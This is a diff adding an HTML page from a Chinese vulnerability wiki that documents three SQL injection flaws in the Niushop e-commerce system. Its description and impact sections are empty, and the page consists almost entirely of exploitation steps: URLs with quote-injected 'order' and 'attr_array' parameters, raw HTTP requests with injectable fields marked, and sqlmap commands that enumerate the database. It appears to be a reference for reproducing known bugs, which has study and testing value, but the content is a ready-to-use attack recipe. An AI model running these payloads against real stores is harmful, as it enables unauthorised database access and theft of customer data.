@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Niushop/Niushop%20sql%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Niushop sql注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Niushop sql\u6ce8\u5165", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Niushop 单商户 2.2 前台getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Nginx/nginx_parsing_vulnerability/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Nginx/nginx_parsing_vulnerability/README.zh-cn/" class="btn btn-xs btn-link">
+        Nginx 解析漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="niushop-sql">Niushop sql注入<a class="headerlink" href="#niushop-sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="sql">sql注入（一）<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h3>
+<h4 id="order">order参数：<a class="headerlink" href="#order" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><code>http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7%27&amp;attr_array[][2]=8&amp;spec_array[]=9
+</code></pre></div>
+
+<h4 id="attr_array">attr_array参数：<a class="headerlink" href="#attr_array" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><code>http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7&amp;attr_array[][2]=8%27&amp;spec_array[]=9
+</code></pre></div>
+
+<h4 id="sqlmap">直接上sqlmap<a class="headerlink" href="#sqlmap" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><code>sqlmap -u &quot;http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7&amp;attr_array[][2]=8*&amp;spec_array[]=9&quot; --random-agent --batch --dbms &quot;mysql&quot;
+sqlmap -u &quot;http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7&amp;attr_array[][2]=8*&amp;spec_array[]=9&quot; --random-agent --batch --dbms &quot;mysql&quot; --current-db
+</code></pre></div>
+
+<h3 id="sql_1">sql注入（二）<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/index.php?s=/wap/Goods/promotionZone&amp;group_id=*&amp;page=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">0-sec.org</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://172.16.209.129:8085/index.php/wap/goods/promotionZone</span>
+<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+
+<p>将数据包保存为niushop.txt</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="nv">r</span><span class="w"> </span><span class="nv">niushop</span>.<span class="nv">txt</span><span class="w">  </span><span class="o">--</span><span class="k">random</span><span class="o">-</span><span class="nv">agent</span><span class="w"> </span><span class="o">--</span><span class="nv">batch</span><span class="w"> </span><span class="o">--</span><span class="nv">dbms</span><span class="w"> </span><span class="s2">&quot;mysql&quot;</span>
+</code></pre></div>
+
+<h3 id="sql_2">sql注入（三）<a class="headerlink" href="#sql_2" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/index.php?s=/wap/Goods/goodsSearchList</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">0-sec.org</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://172.16.209.129:8086/index.php/wap/goods/goodsSearchList</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">66</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
+
+<span class="nt">sear_name</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">sear_type</span><span class="o">=</span><span class="s">1</span><span class="p">&amp;</span><span class="nt">order</span><span class="o">=</span><span class="s">*</span><span class="p">&amp;</span><span class="nt">sort</span><span class="o">=</span><span class="s">asc</span><span class="p">&amp;</span><span class="nt">controlType</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">shop_id</span><span class="o">=</span><span class="s">0</span><span class="p">&amp;</span><span class="nt">page</span><span class="o">=</span><span class="s">1</span>
+</code></pre></div>
+
+<p>数据包保存为niushop.txt</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="nv">r</span><span class="w"> </span><span class="nv">niushop</span>.<span class="nv">txt</span><span class="w">  </span><span class="o">--</span><span class="k">random</span><span class="o">-</span><span class="nv">agent</span><span class="w"> </span><span class="o">--</span><span class="nv">batch</span><span class="w"> </span><span class="o">--</span><span class="nv">dbms</span><span class="w"> </span><span class="err">&quot;mysql</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Niushop 单商户 2.2 前台getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Nginx/nginx_parsing_vulnerability/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Nginx/nginx_parsing_vulnerability/README.zh-cn/" class="btn btn-xs btn-link">
+        Nginx 解析漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
